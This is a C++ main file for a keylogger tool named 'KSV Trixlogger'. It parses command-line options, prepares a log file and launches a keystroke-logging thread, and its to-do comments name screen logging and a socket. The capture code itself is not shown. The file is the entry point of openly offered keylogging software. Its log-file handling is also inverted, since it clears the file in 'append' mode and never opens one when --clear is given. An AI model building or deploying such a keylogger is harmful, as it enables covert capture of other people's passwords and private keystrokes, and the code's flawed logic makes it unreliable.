#include <iostream>
#include <fstream>
#include <thread>
#include "Argumentation.h"
#include "Logger.h"
#include "Keylogger.h"
#include "Presenter.h"

int main(int argc, const char *args[]) {
    Argumentation *argumentation = new Argumentation(argc, args);

    if (argumentation->hasArg((char *) "--version")) {
        Presenter::showVersion();
        exit(0);
    }

    Presenter::showHeader();

    Logger *logger = Logger::instance();
    bool useSameLogFile = true;
    char *file;

    // Obtem o PATH para o arquivo de log de saída, informado no parâmetro de entrada --logFile [path]
    char *inputFileLog = argumentation->value((char *) "--logFile");
    if (inputFileLog != nullptr) {
        file = inputFileLog;
    } else {
        logger->e("Log file output not found! Use --logFile parameter to specify a path to log file. Stopping KSV Trixlogger...");
        exit(1);
    }

    std::cout << "[INFO] Log will be saved at \"" << file << "\"" << std::endl;

    if (std::ifstream(file)) {
        logger->i("Log file already exists");

        if (argumentation->hasArg((char *) "--clear")) {
            logger->i("Clearing log file!");
            useSameLogFile = false;
        } else {
            logger->i("Appending mode on log file!");
        }

        // é para usar o mesmo arquivo? se sim, limpa ele.
        if (useSameLogFile) {
            logger->initLogFile(file, true);
            logger->clearLogFile();

            logger->write("[");
            logger->write(Presenter::version());
            logger->writeln("]");
        }

    } else {
        logger->initLogFile(file, false);
        logger->i("Log file does not exists... Creating on append mode!");

        logger->write("[");
        logger->write(Presenter::version());
        logger->writeln("]");
    }

    logger->line();

    Keylogger keylogger;

    std::thread thread[1];
    thread[0] = std::thread(keylogger);

    // TODO - ScreenLogger
    // TODO - Socket
    // TODO - UI Mode

    thread[0].join();

    return 0;
}